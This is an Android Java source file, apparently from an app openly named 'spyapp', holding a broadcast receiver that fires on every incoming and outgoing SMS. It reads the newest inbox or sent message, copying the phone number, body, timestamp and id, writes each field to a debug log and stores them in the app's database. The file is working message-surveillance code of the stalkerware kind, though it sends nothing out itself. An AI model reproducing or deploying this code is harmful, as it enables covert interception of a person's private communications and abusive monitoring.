package com.app.spyapp.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;

import com.app.spyapp.SpyApp;
import com.app.spyapp.common.Const;
import com.app.spyapp.common.Utils;
import com.app.spyapp.common.WriteLog;
import com.app.spyapp.model.SMSModel;

import java.sql.Date;

/**
 * Created by Ankit on 5/11/2016.
 */
public class SMSReceiver extends BroadcastReceiver {
    private SpyApp spyApp;

    @Override
    public void onReceive(Context context, Intent intent) {
        spyApp = (SpyApp) context.getApplicationContext();
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            //do something with the received sms
            getReceivedSMSinfo(context);
        } else if (intent.getAction().equals("android.provider.Telephony.SMS_SENT")) {
            //do something with the sended sms
            getSentSMSinfo(context);
        }
    }

    //method to get details about received SMS..........
    private void getReceivedSMSinfo(Context context) {
        Uri uri = Uri.parse("content://sms/inbox");
        String str = "";
        Cursor cursor = context.getContentResolver().query(uri, null,
                null, null, null);
        cursor.moveToNext();

        // 1 = Received, etc.
        int type = cursor.getInt(cursor.
                getColumnIndex("type"));
        String msg_id = cursor.getString(cursor.
                getColumnIndex("_id"));
        String phone = cursor.getString(cursor.
                getColumnIndex("address"));
        String dateVal = cursor.getString(cursor.
                getColumnIndex("date"));
        String body = cursor.getString(cursor.
                getColumnIndex("body"));
        Date date = new Date(Long.valueOf(dateVal));

        str = "Received SMS: \n phone is: " + phone;
        str += "\n SMS type is: " + type;
        str += "\n SMS time stamp is:" + date;
        str += "\n SMS body is: " + body;
        str += "\n id is : " + msg_id;


        WriteLog.E("Debug", "Received SMS phone is: " + phone);
        WriteLog.E("Debug", "SMS type is: " + type);
        WriteLog.E("Debug", "SMS time stamp is:" + date);
        WriteLog.E("Debug", "SMS body is: " + body);
        WriteLog.E("Debug", "SMS id is: " + msg_id);

        SMSModel smsModel = new SMSModel();
        smsModel.setMessageId(msg_id);
        smsModel.setMsg(body);
        smsModel.setAddress(phone);
        smsModel.setType(Const.TYPE_RECEIVE_STRING);
        smsModel.setDate(Utils.convertMilisToDate(date.getTime()));
        spyApp.getDatabaseHelper().insertSMS(smsModel);


    }

    //method to get details about Sent SMS...........
    private void getSentSMSinfo(Context context) {
        Uri uri = Uri.parse("content://sms/sent");
        String str = "";
        Cursor cursor = context.getContentResolver().query(uri, null,
                null, null, null);
        cursor.moveToNext();

        // 2 = sent, etc.
        int type = cursor.getInt(cursor.
                getColumnIndex("type"));
        String msg_id = cursor.getString(cursor.
                getColumnIndex("_id"));
        String phone = cursor.getString(cursor.
                getColumnIndex("address"));
        String dateVal = cursor.getString(cursor.
                getColumnIndex("date"));
        String body = cursor.getString(cursor.
                getColumnIndex("body"));
        Date date = new Date(Long.valueOf(dateVal));

        str = "Sent SMS: \n phone is: " + phone;
        str += "\n SMS type is: " + type;
        str += "\n SMS time stamp is:" + date;
        str += "\n SMS body is: " + body;
        str += "\n id is : " + msg_id;


        WriteLog.E("Debug", "sent SMS phone is: " + phone);
        WriteLog.E("Debug", "SMS type is: " + type);
        WriteLog.E("Debug", "SMS time stamp is:" + date);
        WriteLog.E("Debug", "SMS body is: " + body);
        WriteLog.E("Debug", "SMS id is: " + msg_id);

        SMSModel smsModel = new SMSModel();
        smsModel.setMessageId(msg_id);
        smsModel.setMsg(body);
        smsModel.setAddress(phone);
        smsModel.setType("sent");
        smsModel.setDate(Utils.convertMilisToDate(date.getTime()));
        spyApp.getDatabaseHelper().insertSMS(smsModel);

    }

}

